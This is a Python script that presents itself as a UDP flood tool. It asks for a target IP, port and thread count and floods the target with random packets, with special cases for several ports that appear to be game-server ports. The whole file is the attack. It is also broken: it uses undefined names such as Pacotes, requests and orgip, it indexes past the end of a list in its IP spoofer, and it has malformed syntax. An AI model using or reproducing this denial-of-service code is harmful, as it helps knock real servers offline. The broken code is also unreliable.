import socket, struct, codecs, sys, threading, random, time, os
referers = [
     'Your_Server_Bypassed_By_XXBR',
     'Your_Server_Bypassed_By_XXBR',
     'Your_Server_Bypassed_By_XXBR',
     'Your_Server_Bypassed_By_XXBR',
     'Your_Server_Bypassed_By_XXBR',
     'Your_Server_Bypassed_By_XXBR',
     'Your_Server_Bypassed_By_XXBR',
     'Your_Server_Bypassed_By_XXBR',
     'Your_Server_Bypassed_By_XXBR',
     'Your_Server_Bypassed_By_XXBR',
     'Your_Server_Bypassed_By_XXBR',
     'Your_Server_Bypassed_By_XXBR',
     'Your_Server_Bypassed_By_XXBR',
     'Your_Server_Bypassed_By_XXBR',
     'Your_Server_Bypassed_By_XXBR',
     'Your_Server_Bypassed_By_XXBR',
     'Your_Server_Bypassed_By_XXBR',
     'Your_Server_Bypassed_By_XXBR',
     'Your_Server_Bypassed_By_XXBR',
     'Your_Server_Bypassed_By_XXBR',
     'Your_Server_Bypassed_By_XXBR',
     'Your_Server_Bypassed_By_XXBR',
     'Your_Server_Bypassed_By_XXBR',
     'Your_Server_Bypassed_By_XXBR'
     'Your_Server_Bypassed_By_XXBR'
     'Your_Server_Bypassed_By_XXBR',
     'Your_Server_Bypassed_By_XXBR',
     'Your_Server_Bypassed_By_XXBR',
     'Your_Server_Bypassed_By_XXBR',
     'Your_Server_Bypassed_By_XXBR',
     'Your_Server_Bypassed_By_XXBR'
     'Your_Server_Bypassed_By_XXBR']
     
os.system("clear")
print ("\033[35m                      ╔════════════════════════════════════╗")
print ("\033[35m                      ║\033[31m  ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗\033[35m  ║")
print ("\033[35m                      ║\033[31m  ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║ \033[35m  ║")
print ("\033[35m                      ║\033[31m  ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩ \033[35m  ║")
print ("\033[35m                      ╚════════════════════════════════════╝")

choice =str(input("\033[35m[\033[37m!\033[35m] Methods \033[35m? \033[32m"))
ip =str(input("\033[35m[\033[37m!\033[35m] Ip Target ? \033[32m"))
port =int(input("\033[35m[\033[37m!\033[35m] Port Target ? \033[32m"))
times =int(input("\033[35m[\033[37m!\033[35m] Packets ? \033[32m"))
threads =int(input("\033[35m[\033[37m!\033[35m] Threads ? \033[32m"))

def spoofer():
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    addr[4] = str(random.randrange(2, 256))
    addr[5] = str(random.randrange(2, 254))
    addr[6] = str(random.randrange(2, 256))
    assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3] + d + addr[4] + d + addr[5] + d + addr[6]
    return assemebled

def getproxy():
    global proxies
    f = open(f'{nprox}.txt','wb')
    r = requests.get(urlproxy)
    f.write(r.content)
    f.close()
    proxies = open(f'{nprox}.txt').readlines()

class MyThread(threading.Thread):

    def run(self):
        while True:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            bytes = random._urandom(1081)
            pack = random._urandom(666)
            msg = Pacotes[random.randrange(0, 1)]
            sock.sendto(bytes, (ip, int(port)))
            sock.sendto(pack, (ip, int(port)))
            sock.sendto(msg, (ip, int(port)))
            if int(port) == 7777:
                sock.sendto(Pacotes[5], (ip, int(port)))
            elif int(port) == 7796:
                sock.sendto(Pacotes[4], (ip, int(port)))
            elif int(port) == 7771:
                sock.sendto(Pacotes[6], (ip, int(port)))
            elif int(port) == 7784:
                sock.sendto(Pacotes[7], (ip, int(port)))


if __name__ == '__main__':
    try:
        for x in range(500):
            mythread = MyThread()
            mythread.start()
            time.sleep(.1)

    except KeyboardInterrupt:
        os.system('cls' if os.name == 'nt' else 'clear')
        print ("╔════════════════════════════════════╗")
        print ("         ╔═╗╔╦╗╔═╗╔═╗╔═╗╔═╗╔╦╗        ")
        print ("         ╚═╗ ║ ║ ║╠═╝╠═╝║╣  ║║        ")
        print ("         ╚═╝ ╩ ╚═╝╩  ╩  ╚═╝═╩╝        ")
        print ("╚════════════════════════════════════╝")
        print ('\n\n')
        print ('STOP TO ATTACK {}').format(orgip)
